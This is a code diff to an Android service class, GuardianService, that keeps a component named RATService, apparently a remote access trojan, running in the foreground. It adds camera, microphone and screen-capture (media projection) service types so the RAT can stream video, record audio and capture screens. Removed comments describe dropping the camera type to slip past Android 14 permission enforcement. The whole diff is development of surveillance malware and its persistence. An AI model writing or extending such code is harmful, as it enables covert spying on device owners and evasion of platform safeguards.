@@ -90,10 +90,14 @@ public class GuardianService extends Service {
             .build();
         
         // Start as foreground service with appropriate service types for Android 10+
-        // IMPORTANT: Camera type removed to avoid Android 14+ strict enforcement
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            // Combine service types - WITHOUT CAMERA
+            // Combine all service types this service might need
             int foregroundServiceTypes = 0;
+            
+            // Add camera type for video streaming support
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
+            }
             
             // Add microphone type for audio recording
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
@@ -110,12 +114,14 @@ public class GuardianService extends Service {
                 foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
             }
             
-            // Camera type intentionally OMITTED to avoid strict permission enforcement
-            // This allows camera usage with just the regular CAMERA permission
+            // For Android 14+ (API 34+), also add media projection if needed
+            if (Build.VERSION.SDK_INT >= 34) { // Android 14
+                foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
+            }
             
             try {
                 startForeground(NOTIFICATION_ID, notification, foregroundServiceTypes);
-                Log.d(TAG, "Started as foreground service with types (camera excluded): " + foregroundServiceTypes);
+                Log.d(TAG, "Started as foreground service with types: " + foregroundServiceTypes);
             } catch (Exception e) {
                 // Fallback to standard startForeground if type combination fails
                 Log.e(TAG, "Error starting foreground with types, falling back", e);
@@ -183,7 +189,7 @@ public class GuardianService extends Service {
         Log.d(TAG, "Restarting RATService");
         Intent intent = new Intent(this, RATService.class);
         
-        // Use startForegroundService for RATService on Android 8+
+        // Use startForegroundService for RATService on Android 8+ since it needs camera permissions
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(intent);
             Log.d(TAG, "Started RATService as foreground service");
